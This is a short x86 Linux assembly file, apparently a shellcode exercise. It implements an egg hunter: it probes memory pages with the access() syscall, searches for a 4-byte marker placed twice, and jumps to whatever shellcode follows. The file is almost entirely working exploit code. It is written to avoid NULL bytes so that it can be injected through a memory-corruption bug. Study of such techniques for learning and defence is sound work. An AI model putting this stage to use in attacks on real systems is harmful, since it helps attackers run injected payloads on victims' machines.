; egg_hunter.asm
;
; Author: Dennis Tan
; Date: 06-June-2020

global _start

section .text:
    _start:
        xor edx, edx                    ; clear edx register

next_page:
        ; set 4096 bytes pagefile for linux environment
        or dx, 0xfff                    ; used 0xfff and inc due to NULL bytes

next_addr:
        ; int access(const char *pathname, int mode);
        inc edx                         ; edx to 4096
        
        push byte 0x21                  ; push 0x21 to stack
        pop eax                         ; pop 0x21 to eax
        lea ebx, [edx + 0x4]            ; loads the next 8 byte's address into ebx
        int 0x80                        ; invoke syscall for access
        
        cmp al, 0xf2                    ; compare the return value of the syscall to EFAULT
        jz next_page                    ; if EFAULT is returned jump to next_page

        mov eax, 0xdeaddead             ; our 4-byte egg
        mov edi, edx                    ; writable page will be stored in edx

        scasd                           ; cmopares [edi] to first 4-byte of our egg
        jnz next_addr                   ; if egg is not found go to next_addr

        scasd                           ; compares [edi] to the last 4 bytes of our egg
        jnz next_addr                   ; if egg is not found go to next_addr

        jmp edi                         ; execute shellcode
